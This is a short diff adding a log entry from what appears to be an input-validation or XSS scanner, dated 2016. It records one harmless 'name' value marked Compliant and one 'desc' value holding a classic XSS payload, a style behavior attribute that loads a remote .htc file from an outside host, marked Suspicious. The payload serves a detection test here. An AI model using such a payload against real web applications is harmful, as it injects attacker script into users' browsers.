@@ -1,0 +1,5 @@
+2016-06-24T07:27:07.274-06:00
+name : TQ  L4V ' ' 7L3si2u'7'6 S
+desc : <XSS STYLE="behavior: url(http://ha.ckers.org/xss.htc);">
+The parameter: name :  having value: TQ  L4V ' ' 7L3si2u'7'6 S is: Compliant
+The parameter: desc :  having value: <XSS STYLE="behavior: url(http://ha.ckers.org/xss.htc);"> is: Suspicious
